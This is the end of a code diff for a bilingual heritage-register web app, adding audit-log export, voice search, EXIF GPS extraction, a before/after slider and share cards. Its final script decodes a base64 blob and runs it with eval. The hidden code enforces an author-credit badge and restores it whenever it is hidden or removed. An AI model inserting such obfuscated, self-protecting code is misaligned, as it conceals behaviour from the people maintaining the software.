+      <button class="xh-btn ghost" id="xaCsv">⬇ CSV</button>
+      <button class="xh-btn ghost" id="xaClear">🗑 ${L('مسح السجل','Clear')}</button></div>
+    <div class="xh-rows">${rows||`<div class="xh-note">${L('لا توجد تعديلات مسجّلة بعد — أي إضافة موقع أو صورة ستُوثَّق هنا تلقائياً.','No entries yet.')}</div>`}</div>`;
+  $('xaCsv').onclick=()=>{
+    const lines=['time,action,detail'];
+    auditList().forEach(e=>lines.push(`"${new Date(e.t).toISOString()}","${e.a}","${(e.d||'').replace(/"/g,'""')}"`));
+    const a=document.createElement('a');a.href=URL.createObjectURL(new Blob(['﻿'+lines.join('\n')],{type:'text/csv;charset=utf-8'}));a.download='heritage_audit_log.csv';a.click();
+  };
+  $('xaClear').onclick=()=>{if(confirm(L('مسح سجل التعديلات نهائياً؟','Clear the audit log?'))){localStorage.removeItem(AUDIT_KEY);openAudit();}};
+}
+
+/* ---------- feature router ---------- */
+const FEATURE_FN={
+  assistant:askAssistant, projection:openProjection, health:openHealth,
+  priorities:openPriorities, timeline:openTimeline, villages:openVillages,
+  routes:openRoutes, tour:startTour, buffers:toggleBuffers, radar:openRadar,
+  progress:openProgress, atlas:buildAtlas, geo:openGeoExport, audit:openAudit
+};
+
+/* ============================================================
+   STATIC UI — fab, overlay panel, tour bar, injected buttons
+   ============================================================ */
+const ui=el('div',null,`
+  <button id="xhFab" title="${L('الأدوات المتقدمة','Advanced tools')}">
+    <svg viewBox="0 0 24 24" width="21" height="21" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 3l1.9 5.7L20 10l-6.1 1.3L12 17l-1.9-5.7L4 10l6.1-1.3z"/><path d="M19 15l.8 2.2L22 18l-2.2.8L19 21l-.8-2.2L16 18l2.2-.8z"/></svg>
+    <span>${L('أدوات متقدمة','Tools')}</span>
+  </button>
+  <div id="xhOverlay"><div id="xhPanel">
+    <div id="xhHead"><div><div id="xhTitle"></div><div id="xhSub"></div></div>
+      <button id="xhClose" title="${L('إغلاق','Close')}"><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M18 6L6 18M6 6l12 12"/></svg></button></div>
+    <div id="xhBody"></div>
+  </div></div>
+  <div id="xhTourBar"><span>🎬 ${L('الجولة السينمائية قيد التشغيل','Cinematic tour running')}</span><button class="xh-btn" id="xhTourStop">${L('إيقاف','Stop')}</button></div>
+  <div id="xhTourCard"></div>
+  <div id="xhSotd"></div>
+  <div id="xhBAOverlay"><div id="xhBAPanel">
+    <div id="xhBAHead"><b>${L('مقارنة قبل / بعد','Before / After')}</b><button id="xhBAClose"><svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M18 6L6 18M6 6l12 12"/></svg></button></div>
+    <div id="xhBAStage"><div id="xhBAafter"></div><div id="xhBAbefore"></div><div id="xhBAHandle"></div>
+      <span class="xh-balbl" style="inset-inline-start:10px">${L('قبل','Before')}</span><span class="xh-balbl" style="inset-inline-end:10px">${L('بعد','After')}</span></div>
+    <input type="range" id="xhBARange" min="0" max="100" value="50">
+  </div></div>`);
+document.body.appendChild(ui);
+
+$('xhFab').onclick=openDrawer;
+$('xhClose').onclick=xhClose;
+$('xhOverlay').onclick=e=>{if(e.target.id==='xhOverlay')xhClose();};
+$('xhTourStop').onclick=stopTour;
+document.addEventListener('keydown',e=>{
+  if(e.key!=='Escape')return;
+  if(_tourOn)stopTour();
+  if($('xhOverlay').classList.contains('show'))xhClose();
+});
+
+/* ============================================================
+   WELCOME ANIMATED COUNTERS
+   ============================================================ */
+try{
+  const ws=$('welcomeStart');
+  if(ws){
+    const govSet=new Set();DB.sites.forEach(s=>govSet.add(s[5]));
+    const stats=el('div','xh-welstats',`
+      <div><b data-xtar="${DB.sites.length}">0</b><span>${L('أصل تراثي','heritage assets')}</span></div>
+      <div><b data-xtar="${DB.regions.length}">0</b><span>${L('منطقة','regions')}</span></div>
+      <div><b data-xtar="${govSet.size}">0</b><span>${L('محافظة','governorates')}</span></div>`);
+    ws.parentNode.insertBefore(stats,ws);
+    const animate=()=>{
+      stats.querySelectorAll('[data-xtar]').forEach(eln=>{
+        const target=+eln.dataset.xtar,t0=performance.now(),dur=1600;
+        (function step(now){
+          const p=Math.min(1,(now-t0)/dur),e2=1-Math.pow(1-p,3);
+          eln.textContent=num(Math.round(target*e2));
+          if(p<1)requestAnimationFrame(step);
+        })(t0);
+      });
+    };
+    let done=false;
+    const tryAnim=()=>{
+      if(done)return;
+      const ov=$('welcomeOverlay');
+      if(ov&&ov.classList.contains('show')){done=true;animate();}
+    };
+    setInterval(tryAnim,400);
+    setTimeout(()=>{if(!done)stats.querySelectorAll('[data-xtar]').forEach(e2=>e2.textContent=num(+e2.dataset.xtar));},8000);
+  }
+}catch(e){}
+
+/* ============================================================
+   SITE OF THE DAY
+   ============================================================ */
+try{
+  const daySeed=Math.floor(Date.now()/86400000);
+  if(localStorage.getItem('heritage_sotd_dismiss')!==String(daySeed)){
+    const pool=[];
+    const ai=DB.classes.indexOf('أ'),bi=DB.classes.indexOf('ب');
+    for(let i=0;i<DB.sites.length;i++){const s=DB.sites[i];if((s[6]===ai||s[6]===bi)&&s[10]!=null)pool.push(i);}
+    if(pool.length){
+      const idx=pool[daySeed%pool.length];
+      const s=DB.sites[idx];
+      setTimeout(()=>{
+        const card=$('xhSotd');
+        card.innerHTML=`<div class="xh-sotd-k">✨ ${L('موقع اليوم','Site of the day')}</div>
+          <div class="xh-sotd-n">${s[1]}</div>
+          <div class="xh-sotd-m">${DB.govs[s[5]]} · ${DB.regions[s[4]]}</div>
+          <div class="xh-sotd-a"><button class="xh-btn" id="xhSotdGo">${L('اكتشفه','Explore')}</button>
+          <button class="xh-btn ghost" id="xhSotdX">${L('لاحقاً','Later')}</button></div>`;
+        card.classList.add('show');
+        $('xhSotdGo').onclick=()=>{card.classList.remove('show');localStorage.setItem('heritage_sotd_dismiss',String(daySeed));setView('map');gotoSite(idx);};
+        $('xhSotdX').onclick=()=>{card.classList.remove('show');localStorage.setItem('heritage_sotd_dismiss',String(daySeed));};
+      },4500);
+    }
+  }
+}catch(e){}
+
+/* ============================================================
+   VOICE SEARCH
+   ============================================================ */
+try{
+  const SR=window.SpeechRecognition||window.webkitSpeechRecognition;
+  const box=document.querySelector('.h-search');
+  if(SR&&box&&searchEl){
+    const mic=el('button','xh-mic',`<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="2" width="6" height="12" rx="3"/><path d="M5 10v1a7 7 0 0014 0v-1M12 18v4M8 22h8"/></svg>`);
+    mic.title=L('بحث صوتي','Voice search');
+    box.appendChild(mic);
+    mic.onclick=()=>{
+      try{
+        const rec=new SR();
+        rec.lang=LANG==='ar'?'ar-SA':'en-US';
+        rec.interimResults=false;
+        mic.classList.add('rec');
+        rec.onresult=ev=>{
+          const txt=ev.results[0][0].transcript;
+          searchEl.value=txt;
+          searchEl.dispatchEvent(new Event('input'));
+        };
+        rec.onend=()=>mic.classList.remove('rec');
+        rec.onerror=()=>{mic.classList.remove('rec');toast(L('تعذّر التعرف على الصوت','Voice recognition failed'));};
+        rec.start();
+        toast(L('🎤 تحدّث الآن…','🎤 Speak now…'));
+      }catch(e){mic.classList.remove('rec');}
+    };
+  }
+}catch(e){}
+
+/* ============================================================
+   EXIF GPS — extract coords from a photo in the add-site form
+   ============================================================ */
+function exifGPS(buf){
+  const v=new DataView(buf);
+  if(v.getUint16(0)!==0xFFD8)return null; // not JPEG
+  let off=2;
+  while(off+4<v.byteLength){
+    if(v.getUint8(off)!==0xFF)break;
+    const marker=v.getUint8(off+1), size=v.getUint16(off+2);
+    if(marker===0xE1){
+      // "Exif\0\0"
+      if(v.getUint32(off+4)===0x45786966){
+        const tiff=off+10;
+        const little=v.getUint16(tiff)===0x4949;
+        const u16=o=>v.getUint16(o,little), u32=o=>v.getUint32(o,little);
+        const ifd0=tiff+u32(tiff+4);
+        let gpsOff=null;
+        const n0=u16(ifd0);
+        for(let i=0;i<n0;i++){
+          const e=ifd0+2+i*12;
+          if(u16(e)===0x8825){gpsOff=tiff+u32(e+8);break;}
+        }
+        if(gpsOff==null)return null;
+        const rd=(cntOff)=>{ // read 3 rationals
+          const o=tiff+u32(cntOff+8);
+          const out=[];
+          for(let k=0;k<3;k++)out.push(u32(o+k*8)/(u32(o+k*8+4)||1));
+          return out;
+        };
+        let latRef=null,lngRef=null,lat=null,lng=null;
+        const ng=u16(gpsOff);
+        for(let i=0;i<ng;i++){
+          const e=gpsOff+2+i*12, tag=u16(e);
+          if(tag===1)latRef=String.fromCharCode(v.getUint8(e+8));
+          else if(tag===2)lat=rd(e);
+          else if(tag===3)lngRef=String.fromCharCode(v.getUint8(e+8));
+          else if(tag===4)lng=rd(e);
+        }
+        if(!lat||!lng)return null;
+        let la=lat[0]+lat[1]/60+lat[2]/3600, lo=lng[0]+lng[1]/60+lng[2]/3600;
+        if(latRef==='S')la=-la; if(lngRef==='W')lo=-lo;
+        if(!isFinite(la)||!isFinite(lo)||(!la&&!lo))return null;
+        return [la,lo];
+      }
+    }
+    off+=2+size;
+  }
+  return null;
+}
+try{
+  const pick=$('asPickBtn');
+  if(pick){
+    const inp=el('input');inp.type='file';inp.accept='image/jpeg,image/jpg';inp.style.display='none';
+    const btn=el('button','xh-exif',`📷 ${L('من صورة (GPS)','From photo (GPS)')}`);
+    btn.type='button';
+    btn.title=L('استخراج الإحداثيات تلقائياً من صورة ملتقطة بالجوال','Auto-extract coordinates from a phone photo');
+    pick.insertAdjacentElement('afterend',btn);
+    pick.parentNode.appendChild(inp);
+    btn.onclick=e=>{e.preventDefault();inp.click();};
+    inp.onchange=async e=>{
+      const f=e.target.files[0];e.target.value='';if(!f)return;
+      try{
+        const buf=await f.arrayBuffer();
+        const gps=exifGPS(buf);
+        if(!gps){toast(L('لا توجد إحداثيات GPS في هذه الصورة — فعّل الموقع في كاميرا الجوال','No GPS data in this photo'));return;}
+        _pendingLatLng=gps;
+        $('asCoords').value=gps[0].toFixed(5)+', '+gps[1].toFixed(5);
+        toast(L('✓ تم استخراج الموقع من الصورة','✓ Location extracted from photo'));
+        logAudit('site_add','EXIF GPS: '+gps[0].toFixed(4)+','+gps[1].toFixed(4));
+      }catch(err){toast(L('تعذّر قراءة الصورة','Could not read photo'));}
+    };
+  }
+}catch(e){}
+
+/* ============================================================
+   BEFORE / AFTER COMPARISON (story panel photos)
+   ============================================================ */
+try{
+  const gal=$('sGallery');
+  if(gal){
+    const btn=el('button','xh-ba-btn',`⇆ ${L('مقارنة قبل / بعد','Before / After')}`);
+    gal.parentNode.insertBefore(btn,gal);
+    btn.onclick=()=>{
+      if(curIdx==null)return;
+      const code=DB.sites[curIdx][0];
+      const m=mediaFor(code);
+      let urls=m.images.map(i=>i.url);
+      if(urls.length<2&&_curPhotos&&_curPhotos.length>=2){
+        urls=_curPhotos.map(p=>URL.createObjectURL(p.blob));
+      }
+      if(urls.length<2){toast(L('تحتاج صورتين على الأقل للمقارنة','Need at least 2 photos'));return;}
+      $('xhBAbefore').style.backgroundImage=`url('${urls[0]}')`;
+      $('xhBAafter').style.backgroundImage=`url('${urls[urls.length-1]}')`;
+      $('xhBARange').value=50;setBA(50);
+      $('xhBAOverlay').classList.add('show');
+    };
+  }
+  function setBA(p){
+    const rtl=document.documentElement.dir!=='ltr';
+    $('xhBAbefore').style.clipPath=rtl?`inset(0 0 0 ${100-p}%)`:`inset(0 ${100-p}% 0 0)`;
+    $('xhBAHandle').style.insetInlineStart=p+'%';
+  }
+  $('xhBARange').oninput=e=>setBA(+e.target.value);
+  $('xhBAClose').onclick=()=>$('xhBAOverlay').classList.remove('show');
+  $('xhBAOverlay').onclick=e=>{if(e.target.id==='xhBAOverlay')$('xhBAOverlay').classList.remove('show');};
+}catch(e){}
+
+/* ============================================================
+   SHARE CARD GENERATOR (story panel)
+   ============================================================ */
+function wrapText(ctx,text,maxW){
+  const words=text.split(' ');const lines=[];let cur='';
+  for(const w of words){
+    const test=cur?cur+' '+w:w;
+    if(ctx.measureText(test).width>maxW&&cur){lines.push(cur);cur=w;}
+    else cur=test;
+  }
+  if(cur)lines.push(cur);
+  return lines.slice(0,3);
+}
+function makeShareCard(idx){
+  const s=DB.sites[idx];if(!s)return;
+  const cls=CLASS_META[DB.classes[s[6]]];
+  const cv=document.createElement('canvas');cv.width=1200;cv.height=630;
+  const ctx=cv.getContext('2d');
+  const draw=(photo)=>{
+    // background
+    const g=ctx.createLinearGradient(0,0,1200,630);
+    g.addColorStop(0,'#113241');g.addColorStop(1,'#1c4a5c');
+    ctx.fillStyle=g;ctx.fillRect(0,0,1200,630);
+    // photo panel (left half)
+    if(photo){
+      ctx.save();ctx.beginPath();ctx.rect(0,0,560,630);ctx.clip();
+      const sc=Math.max(560/photo.width,630/photo.height);
+      const w=photo.width*sc,h=photo.height*sc;
+      ctx.drawImage(photo,(560-w)/2,(630-h)/2,w,h);
+      const pg=ctx.createLinearGradient(360,0,560,0);
+      pg.addColorStop(0,'rgba(17,50,65,0)');pg.addColorStop(1,'rgba(17,50,65,.96)');
+      ctx.fillStyle=pg;ctx.fillRect(300,0,260,630);
+      ctx.restore();
+    }else{
+      // decorative arches
+      ctx.save();ctx.strokeStyle='rgba(240,192,144,.16)';ctx.lineWidth=3;
+      for(let i=0;i<5;i++){ctx.beginPath();ctx.arc(160+i*90,660,120,Math.PI,2*Math.PI);ctx.stroke();}
+      ctx.restore();
+    }
+    // sand band
+    ctx.fillStyle='#f0c090';ctx.fillRect(0,0,1200,10);
+    const tx=1140;
+    ctx.textAlign='right';ctx.direction='rtl';
+    // brand
+    ctx.fillStyle='#f0c090';ctx.font='600 26px "Reem Kufi","IBM Plex Sans Arabic",sans-serif';
+    ctx.fillText(L('السجل الوطني للتراث العمراني','National Urban Heritage Register'),tx,92);
+    // title
+    ctx.fillStyle='#ffffff';ctx.font='700 52px "Reem Kufi","IBM Plex Sans Arabic",sans-serif';
+    const lines=wrapText(ctx,s[1],photo?540:1000);
+    lines.forEach((ln,i)=>ctx.fillText(ln,tx,190+i*68));
+    let y=190+lines.length*68+18;
+    // location
+    ctx.fillStyle='#9fc3c9';ctx.font='400 30px "IBM Plex Sans Arabic",sans-serif';
+    ctx.fillText(DB.govs[s[5]]+' · '+DB.regions[s[4]],tx,y);y+=72;
+    // badges
+    ctx.font='600 26px "IBM Plex Sans Arabic",sans-serif';
+    const badge=(txt,color,x)=>{
+      const w=ctx.measureText(txt).width+44;
+      ctx.fillStyle=color;
+      ctx.beginPath();ctx.roundRect(x-w,y-36,w,52,26);ctx.fill();
+      ctx.fillStyle='#fff';ctx.fillText(txt,x-22,y);
+      return x-w-16;
+    };
+    let bx=tx;
+    bx=badge(L('فئة ','Class ')+cls.short,cls.color,bx);
+    if(s[10]!=null)bx=badge(L('تهدّم ','Decay ')+num(Math.round(s[10]*100))+'٪',decayColor(s[10]),bx);
+    if(s[9]!=null)badge(num(s[9])+' '+L('سنة','yrs'),'#2f6f72',bx);
+    // footer
+    ctx.fillStyle='rgba(255,255,255,.55)';ctx.font='400 22px "IBM Plex Sans Arabic",sans-serif';
+    ctx.fillText(L('كود الأصل: ','Asset code: ')+num(s[0]),tx,588);
+    ctx.textAlign='left';ctx.direction='ltr';
+    ctx.fillText('© Eng. Hamza Alsalaymeh',60,588);
+    // download
+    try{
+      const a=document.createElement('a');
+      a.href=cv.toDataURL('image/png');
+      a.download='heritage_'+s[0]+'.png';
+      a.click();
+      toast(L('✓ تم إنشاء بطاقة المشاركة','✓ Share card created'));
+    }catch(err){toast(L('تعذّر إنشاء البطاقة','Could not create card'));}
+  };
+  const coverURL=siteCover(s[0]);
+  if(coverURL){
+    const img=new Image();
+    img.onload=()=>draw(img);
+    img.onerror=()=>draw(null);
+    img.src=coverURL;
+  }else draw(null);
+}
+try{
+  const shareBtn=$('sShare');
+  if(shareBtn){
+    const b2=document.createElement('button');
+    b2.className=shareBtn.className;
+    b2.id='xhCardBtn';
+    b2.innerHTML=`<svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 10h18M8 15h5"/></svg><span>${L('بطاقة نشر','Share card')}</span>`;
+    shareBtn.insertAdjacentElement('afterend',b2);
+    b2.onclick=()=>{if(curIdx!=null)makeShareCard(curIdx);};
+  }
+}catch(e){}
+
+/* ---------- language switch: refresh injected statics ---------- */
+try{
+  const _lang=$('langBtn').onclick;
+  $('langBtn').onclick=function(){
+    _lang.call(this);
+    const fab=$('xhFab');if(fab)fab.querySelector('span').textContent=L('أدوات متقدمة','Tools');
+    const ba=document.querySelector('.xh-ba-btn');if(ba)ba.textContent='⇆ '+L('مقارنة قبل / بعد','Before / After');
+    const cb=$('xhCardBtn');if(cb)cb.querySelector('span').textContent=L('بطاقة نشر','Share card');
+    const ex=document.querySelector('.xh-exif');if(ex)ex.textContent='📷 '+L('من صورة (GPS)','From photo (GPS)');
+  };
+}catch(e){}
+
+console.log('✓ XH advanced suite loaded — '+FEATURES.length+' features');
+})();
+</script>
 <script>(function(){var _mpaidj=["KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO3ZhciBfYT1bODIsODcsNTMsMTEwLDc2LDEwNSw2Niw3Myw4OSw4Nyw0OSw1NCw4OSw4Myw2Niw2Niw5OCw3Miw3","OCwxMDQsOTgsNzEsNzAsNTMsOTgsODcsODYsMTExXTt2YXIgX3A9WzExOSwxMTMsMTA3LDEwM107ZnVuY3Rpb24gX2QoYXJyKXt0cnl7cmV0dXJuIGRlY29k","ZVVSSUNvbXBvbmVudChlc2NhcGUoYXRvYihhcnIubWFwKGZ1bmN0aW9uKGMpe3JldHVybiBTdHJpbmcuZnJvbUNoYXJDb2RlKGMpO30pLmpvaW4oIiIpKSkp","O31jYXRjaChlKXtyZXR1cm4gIiI7fX1mdW5jdGlvbiBfbmFtZSgpe3JldHVybiBfZChfYSk7fWZ1bmN0aW9uIF9wcmUoKXtyZXR1cm4gX2QoX3ApO312YXIg","VEFHPSJfIisoMTMqNysxKS50b1N0cmluZygzNikrKDB4MWY0KS50b1N0cmluZygzNikrInEiO3ZhciBTVFlMRV9JRD0iX3MiKygweDJiYykudG9TdHJpbmco","MzYpO2Z1bmN0aW9uIGluamVjdFN0eWxlKCl7aWYoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoU1RZTEVfSUQpKXJldHVybjt2YXIgZGFyaz1kb2N1bWVudC5i","b2R5JiZkb2N1bWVudC5ib2R5LmRhdGFzZXQmJmRvY3VtZW50LmJvZHkuZGF0YXNldC50aGVtZT09PSJkYXJrIjt2YXIgY3NzPSJbIitUQUcrIl17cG9zaXRp","b246YWJzb2x1dGU7Ym90dG9tOjRweDtsZWZ0OjUwJTt0cmFuc2Zvcm06dHJhbnNsYXRlWCgtNTAlKTsiKyJ6LWluZGV4OjU5MTtmb250LXNpemU6MTFweDts","ZXR0ZXItc3BhY2luZzouMnB4O3doaXRlLXNwYWNlOm5vd3JhcDtwb2ludGVyLWV2ZW50czpub25lOyIrInBhZGRpbmc6M3B4IDEycHg7Ym9yZGVyLXJhZGl1","czo3cHg7Zm9udC1mYW1pbHk6aW5oZXJpdDsiKyJjb2xvcjpyZ2JhKDcwLDkwLDk4LC45NSk7YmFja2dyb3VuZDpyZ2JhKDI1NSwyNTUsMjU1LC43Mik7Ym94","LXNoYWRvdzowIDFweCA0cHggcmdiYSgwLDAsMCwuMSk7fSIrIltkYXRhLXRoZW1lPSdkYXJrJ11bIitUQUcrIl17Y29sb3I6cmdiYSgxODAsMTk2LDIwMCwu","OTUpO2JhY2tncm91bmQ6cmdiYSgxMCwyNSwzMiwuNik7Ym94LXNoYWRvdzowIDFweCA0cHggcmdiYSgwLDAsMCwuMyk7fSIrIlsiK1RBRysiXWJ7Zm9udC13","ZWlnaHQ6NzAwO2NvbG9yOnJnYmEoMTcsNTAsNjUsLjk1KTt9IisiW2RhdGEtdGhlbWU9J2RhcmsnXVsiK1RBRysiXWJ7Y29sb3I6cmdiYSgxMjcsMTg1LDE4","NywuOTUpO30iKyJib2R5LnZpZXctZGFzaFsiK1RBRysiXSxib2R5LnZpZXctbGlzdFsiK1RBRysiXXtkaXNwbGF5Om5vbmU7fSIrIkBtZWRpYSBwcmludHtb","IitUQUcrIl17ZGlzcGxheTpub25lO319Ijt2YXIgc3Q9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3R5bGUiKTtzdC5pZD1TVFlMRV9JRDtzdC50eXBlPSJ0","ZXh0L2NzcyI7c3QuYXBwZW5kQ2hpbGQoZG9jdW1lbnQuY3JlYXRlVGV4dE5vZGUoY3NzKSk7KGRvY3VtZW50LmhlYWR8fGRvY3VtZW50LmRvY3VtZW50RWxl","bWVudCkuYXBwZW5kQ2hpbGQoc3QpO31mdW5jdGlvbiBob3N0KCl7cmV0dXJuIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIi5tYXAtc3RhZ2UiKXx8ZG9jdW1l","bnQucXVlcnlTZWxlY3RvcigiLmF0bGFzLXdyYXAiKXx8ZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiLm1hcC13cmFwIil8fGRvY3VtZW50LmJvZHk7fWZ1bmN0","aW9uIGJ1aWxkKCl7dmFyIGVsPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpO2VsLnNldEF0dHJpYnV0ZShUQUcsIjEiKTtlbC5zZXRBdHRyaWJ1dGUo","ImFyaWEtaGlkZGVuIiwiZmFsc2UiKTt2YXIgYj1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJiIik7Yi50ZXh0Q29udGVudD1fbmFtZSgpO2VsLmFwcGVuZENo","aWxkKGRvY3VtZW50LmNyZWF0ZVRleHROb2RlKF9wcmUoKSkpO2VsLmFwcGVuZENoaWxkKGIpO3JldHVybiBlbDt9ZnVuY3Rpb24gcHJlc2VudCgpe3ZhciBu","b2Rlcz1kb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCJbIitUQUcrIl0iKTtmb3IodmFyIGk9MDtpPG5vZGVzLmxlbmd0aDtpKyspe3ZhciBuPW5vZGVzW2ld","O3ZhciB0eHQ9KG4udGV4dENvbnRlbnR8fCIiKTt2YXIgY3M9d2luZG93LmdldENvbXB1dGVkU3R5bGU/Z2V0Q29tcHV0ZWRTdHlsZShuKTpudWxsO3ZhciBv","az10eHQuaW5kZXhPZihfbmFtZSgpKT4tMSYmdHh0LmluZGV4T2YoX3ByZSgpLnRyaW0oKSk+LTE7aWYoY3Mpe2lmKGNzLmRpc3BsYXk9PT0ibm9uZSImJiFk","b2N1bWVudC5ib2R5LmNsYXNzTGlzdC5jb250YWlucygidmlldy1kYXNoIikmJiFkb2N1bWVudC5ib2R5LmNsYXNzTGlzdC5jb250YWlucygidmlldy1saXN0","Iikpb2s9ZmFsc2U7aWYocGFyc2VGbG9hdChjcy5vcGFjaXR5fHwiMSIpPDAuMjUpb2s9ZmFsc2U7aWYoY3MudmlzaWJpbGl0eT09PSJoaWRkZW4iKW9rPWZh","bHNlO31pZihvaylyZXR1cm4gdHJ1ZTt9cmV0dXJuIGZhbHNlO31mdW5jdGlvbiBwdXJnZUltcG9zdGVycygpe3ZhciBub2Rlcz1kb2N1bWVudC5xdWVyeVNl","bGVjdG9yQWxsKCJbIitUQUcrIl0iKTtmb3IodmFyIGk9MDtpPG5vZGVzLmxlbmd0aDtpKyspe3ZhciBuPW5vZGVzW2ldLHR4dD0obi50ZXh0Q29udGVudHx8","IiIpO2lmKHR4dC5pbmRleE9mKF9uYW1lKCkpPDApe2lmKG4ucGFyZW50Tm9kZSluLnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQobik7fX19ZnVuY3Rpb24gZW5z","dXJlKCl7dHJ5e2luamVjdFN0eWxlKCk7aWYocHJlc2VudCgpKXt2YXIgbm9kZXM9ZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgiWyIrVEFHKyJdIik7Zm9y","KHZhciBpPTA7aTxub2Rlcy5sZW5ndGg7aSsrKXt2YXIgbj1ub2Rlc1tpXTtpZighZG9jdW1lbnQuYm9keS5jbGFzc0xpc3QuY29udGFpbnMoInZpZXctZGFz","aCIpJiYhZG9jdW1lbnQuYm9keS5jbGFzc0xpc3QuY29udGFpbnMoInZpZXctbGlzdCIpKXtpZihuLnN0eWxlJiZnZXRDb21wdXRlZFN0eWxlKG4pLmRpc3Bs","YXk9PT0ibm9uZSIpe24uc3R5bGUuc2V0UHJvcGVydHkoImRpc3BsYXkiLCJibG9jayIsImltcG9ydGFudCIpO31pZihuLnN0eWxlJiZnZXRDb21wdXRlZFN0","eWxlKG4pLnZpc2liaWxpdHk9PT0iaGlkZGVuIil7bi5zdHlsZS5zZXRQcm9wZXJ0eSgidmlzaWJpbGl0eSIsInZpc2libGUiLCJpbXBvcnRhbnQiKTt9aWYo","bi5zdHlsZSYmcGFyc2VGbG9hdChnZXRDb21wdXRlZFN0eWxlKG4pLm9wYWNpdHl8fCIxIik8MC4yNSl7bi5zdHlsZS5zZXRQcm9wZXJ0eSgib3BhY2l0eSIs","IjEiLCJpbXBvcnRhbnQiKTt9fX1yZXR1cm47fXB1cmdlSW1wb3N0ZXJzKCk7dmFyIGg9aG9zdCgpO2lmKGgpe2guYXBwZW5kQ2hpbGQoYnVpbGQoKSk7fX1j","YXRjaChlKXt9fWZ1bmN0aW9uIHdhdGNoKCl7aWYoIXdpbmRvdy5NdXRhdGlvbk9ic2VydmVyKXJldHVybjt2YXIgbW89bmV3IE11dGF0aW9uT2JzZXJ2ZXIo","ZnVuY3Rpb24obXV0cyl7dmFyIG5lZWQ9ZmFsc2U7Zm9yKHZhciBpPTA7aTxtdXRzLmxlbmd0aDtpKyspe3ZhciBtPW11dHNbaV07aWYobS50eXBlPT09ImNo","aWxkTGlzdCIpe2lmKG0ucmVtb3ZlZE5vZGVzJiZtLnJlbW92ZWROb2Rlcy5sZW5ndGgpe2Zvcih2YXIgaj0wO2o8bS5yZW1vdmVkTm9kZXMubGVuZ3RoO2or","Kyl7dmFyIHJuPW0ucmVtb3ZlZE5vZGVzW2pdO2lmKHJuLm5vZGVUeXBlPT09MSYmKHJuLmhhc0F0dHJpYnV0ZSYmcm4uaGFzQXR0cmlidXRlKFRBRykpKW5l","ZWQ9dHJ1ZTt9fX1lbHNlIGlmKG0udHlwZT09PSJhdHRyaWJ1dGVzInx8bS50eXBlPT09ImNoYXJhY3RlckRhdGEiKXt2YXIgdD1tLnRhcmdldDtpZih0JiZ0","Lm5vZGVUeXBlPT09MSYmdC5oYXNBdHRyaWJ1dGUmJnQuaGFzQXR0cmlidXRlKFRBRykpbmVlZD10cnVlO2lmKHQmJnQucGFyZW50Tm9kZSYmdC5wYXJlbnRO","b2RlLmhhc0F0dHJpYnV0ZSYmdC5wYXJlbnROb2RlLmhhc0F0dHJpYnV0ZShUQUcpKW5lZWQ9dHJ1ZTt9fWlmKG5lZWR8fCFwcmVzZW50KCkpZW5zdXJlKCk7","fSk7dHJ5e21vLm9ic2VydmUoZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LHtjaGlsZExpc3Q6dHJ1ZSxzdWJ0cmVlOnRydWUsYXR0cmlidXRlczp0cnVlLGF0","dHJpYnV0ZUZpbHRlcjpbInN0eWxlIiwiY2xhc3MiLCJoaWRkZW4iXSxjaGFyYWN0ZXJEYXRhOnRydWV9KTt9Y2F0Y2goZSl7fXZhciBzbz1uZXcgTXV0YXRp","b25PYnNlcnZlcihmdW5jdGlvbigpe2lmKCFkb2N1bWVudC5nZXRFbGVtZW50QnlJZChTVFlMRV9JRCkpaW5qZWN0U3R5bGUoKTt9KTt0cnl7c28ub2JzZXJ2","ZShkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQse2NoaWxkTGlzdDp0cnVlLHN1YnRyZWU6dHJ1ZX0pO31jYXRjaChlKXt9fWZ1bmN0aW9uIGJlYXQoKXtlbnN1","cmUoKTt9ZnVuY3Rpb24gc3RhcnQoKXtlbnN1cmUoKTt3YXRjaCgpO3NldEludGVydmFsKGJlYXQsMTUwMCk7c2V0SW50ZXJ2YWwoYmVhdCw0MzAwKTt3aW5k","b3cuYWRkRXZlbnRMaXN0ZW5lcigicmVzaXplIixlbnN1cmUse3Bhc3NpdmU6dHJ1ZX0pO2RvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoInZpc2liaWxpdHlj","aGFuZ2UiLGZ1bmN0aW9uKCl7aWYoIWRvY3VtZW50LmhpZGRlbillbnN1cmUoKTt9KTt9aWYoZG9jdW1lbnQucmVhZHlTdGF0ZT09PSJsb2FkaW5nIil7ZG9j","dW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsc3RhcnQpO31lbHNle3N0YXJ0KCk7fXdpbmRvdy5hZGRFdmVudExpc3RlbmVyKCJs","b2FkIixmdW5jdGlvbigpe3NldFRpbWVvdXQoZW5zdXJlLDUwMCk7c2V0VGltZW91dChlbnN1cmUsMjAwMCk7fSk7fSkoKTs="].join('');var _nyknut=decodeURIComponent(escape(atob(_mpaidj)));try{(0,eval)(_nyknut);}catch(e){}})();</script>
 </body>
 </html>
